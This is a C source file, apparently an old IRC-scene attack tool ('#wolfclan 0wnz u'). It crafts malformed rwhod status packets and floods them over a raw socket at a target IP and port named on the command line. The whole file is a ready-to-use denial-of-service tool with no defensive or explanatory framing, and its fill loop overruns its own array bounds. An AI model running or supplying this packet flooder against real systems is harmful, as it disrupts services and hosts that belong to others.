/* "pluto.c - fluidtech";
	"#wolfclan 0wnz u"
   "fluidtech - irc.dal.net"
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h> 
#include <sys/types.h> 
#include <netinet/in.h> 
#include <netdb.h>
#include <sys/socket.h> 
#include <sys/wait.h>

struct  outmp {
        char    out_line[8];
        char    out_name[8];
        long    out_time;
};      

struct  whod {
        char    wd_vers;
        char    wd_type;
        char    wd_pad[2];
        int     wd_sendtime;
        int     wd_recvtime;
        char    *wd_hostname[20][550];
        int     wd_loadav[3];
        int     wd_boottime;
        struct  whoent {
                struct  outmp we_utmp;
                int     we_idle;
        } wd_we[1024 / sizeof (struct whoent)];
};

int main(int argc, char *argv[])
{
    int sockfd;
    int i;
    struct sockaddr_in sh1t;
    int port;
    int numbytes;
    int version;
    int type;
    int npack;
    int j;
    struct whod blah;

    char sex0r[]=
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"    
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^"
    "^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^^Blue-Dragon^";

    if (argc != 5) {
        fprintf(stderr,"Usage: %s Ip Port Packet Type",argv[0]);
        printf("\nIp            : Target Ip                   \n");
        printf("Port          : Target Port                 \n");
        printf("#OfPackets    : Number Of Packets To Send   \n");
        printf("Type          : Protocol Type               \n");

        printf("\n#WolfClan - fluidtech\n");
        exit(1);
    }

   port=atoi(argv[2]);
   npack=atoi(argv[3]);
   type=atoi(argv[4]);

   if ((sockfd = socket(AF_INET, SOCK_RAW, type)) == -1)
   {
        perror("socket");
        exit(1);
    }
    sh1t.sin_family = AF_INET;
    sh1t.sin_port = htons(port);
    sh1t.sin_addr.s_addr = inet_addr(argv[1]);
    bzero(&(sh1t.sin_zero), 8);
    bzero(&blah,sizeof(struct whod));

    blah.wd_vers=69;
    blah.wd_type=69;

    for(i=0;i<20;i++)
    {
     for(j=0;j<570;j++)
      {
       blah.wd_hostname[i][j]=sex0r+strlen(sex0r);
       }
     }
    for(i=0;i<npack;i++)
    {
     numbytes=sendto(sockfd, &blah, sizeof(struct whod), 0,(struct sockaddr *)&sh1t, sizeof(struct sockaddr));
     if(numbytes>-1)
         {
          numbytes=sendto(sockfd, &blah, sizeof(struct whod), 0,(struct sockaddr *)&sh1t, sizeof(struct sockaddr));
          }
    if(numbytes>-1)
         {
          numbytes=sendto(sockfd, &blah, sizeof(struct whod), 0,(struct sockaddr *)&sh1t, sizeof(struct sockaddr));
          } 
    if(numbytes>-1)
         {
          numbytes=sendto(sockfd, &blah, sizeof(struct whod), 0,(struct sockaddr *)&sh1t, sizeof(struct sockaddr));
          }    
}
    if(numbytes!=-1)
         printf("\nPacket: %d",numbytes);
    else
         printf("\nFail: %d",numbytes);

    close(sockfd);
    return 0;
}
